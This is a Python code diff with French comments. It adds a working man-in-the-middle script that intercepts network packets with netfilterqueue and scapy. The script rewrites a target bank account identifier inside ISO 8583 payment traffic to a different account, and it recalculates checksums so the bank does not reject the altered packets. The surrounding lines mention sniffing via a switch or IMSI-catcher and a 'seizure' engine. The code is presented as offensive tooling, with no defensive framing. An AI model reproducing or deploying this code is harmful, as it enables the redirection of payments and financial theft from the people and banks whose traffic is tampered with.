@@ -57,3 +57,32 @@ seizure_engine.pki_unlock("AUTH_VALID_FARDC_2025")
 
 # Sniffing sur l'interface du Switch ou de l'IMSI-Catcher
 scapy.sniff(iface="eth1", filter="tcp port 80 or tcp port 443", prn=seizure_engine.intercept_and_modify)
+
+from netfilterqueue import NetfilterQueue
+from scapy.all import IP, TCP, Raw
+
+def process_packet(packet):
+    scapy_pkt = IP(packet.get_payload())
+    
+    if scapy_pkt.haslayer(Raw):
+        payload = scapy_pkt[Raw].load
+        # Logique de modification ISO 8583
+        if b"TARGET_RIB_XYZ" in payload:
+            print("[OFFENSIVE] Cible détectée. Redirection du flux...")
+            modified_payload = payload.replace(b"TARGET_RIB_XYZ", b"STATE_ACC_7788")
+            scapy_pkt[Raw].load = modified_payload
+            
+            # Recalcul des sommes de contrôle pour éviter le rejet par la banque
+            del scapy_pkt[IP].chksum
+            del scapy_pkt[TCP].chksum
+            
+            packet.set_payload(bytes(scapy_pkt))
+    
+    packet.accept() # Réinjection du paquet (modifié ou non)
+
+nfqueue = NetfilterQueue()
+nfqueue.bind(1, process_packet)
+try:
+    nfqueue.run()
+except KeyboardInterrupt:
+    nfqueue.unbind()
